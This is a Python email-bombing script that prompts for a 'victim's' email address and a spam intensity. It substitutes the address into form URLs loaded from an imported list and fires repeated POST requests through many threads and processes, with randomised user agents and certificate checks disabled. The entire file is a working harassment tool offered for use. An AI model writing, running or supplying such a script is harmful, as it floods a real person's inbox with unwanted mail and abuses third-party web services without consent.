import requests, multiprocessing, time, random, sys, os, threading, time
from urllib3.exceptions import InsecureRequestWarning
from fake_useragent import UserAgent
import custom_urls # Import the file named "custom_urls.py"

ua = UserAgent()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

spam_id = str(input('Enter Your victim\'s Email Address [i.e. : victim@example.com]>>> '))
while True:
    bot_power = input('Enter the power of spamming [i.e. : 2] >>> ')
    try:
        bot_power = int(bot_power)
        break
    except:
        pass

def each_bot(link):
	for single_url in link:
		single_url = single_url.replace('email=', f'email={spam_id}')
		header = {'User-Agent': f'{ua.random}'}
		try:
			resp = requests.post(url=str(single_url), headers=header, verify=False, timeout=5)
			print(resp.status_code)
		except:
			print('urllib3 Error')

def thread_power(for_list):
	bot_name = 'botting_0 = threading.Thread(target=each_bot, args= (for_list,))'
	bot_start = 'botting_0.start()'
	bot_join = 'botting_0.join()'
	for botting_size in range(bot_power):
		bot_name = bot_name.replace(str(botting_size - 1), str(botting_size))
		exec(bot_name)
		bot_start = bot_start.replace(str(botting_size - 1), str(botting_size))
		exec(bot_start)
		bot_join = bot_join.replace(str(botting_size - 1), str(botting_size))
		exec(bot_join)

def create_process(big_list):
	thread_name = 'link_thread_0 = multiprocessing.Process(target= thread_power, args= (hope,))'
	thread_start = 'link_thread_0.start()'
	thread_join = 'link_thread_0.join()'
	for the_len in range(len(big_list)):
		hope = big_list[the_len]
		thread_name = thread_name.replace(str(the_len - 1), str(the_len))
		exec(thread_name)
		thread_start = thread_start.replace(str(the_len - 1), str(the_len))
		exec(thread_start)
		thread_join = thread_join.replace(str(the_len - 1), str(the_len))
		exec(thread_join)

try:
	create_process(custom_urls.total_urls)
except KeyboardInterrupt:
	print('User Ended Program')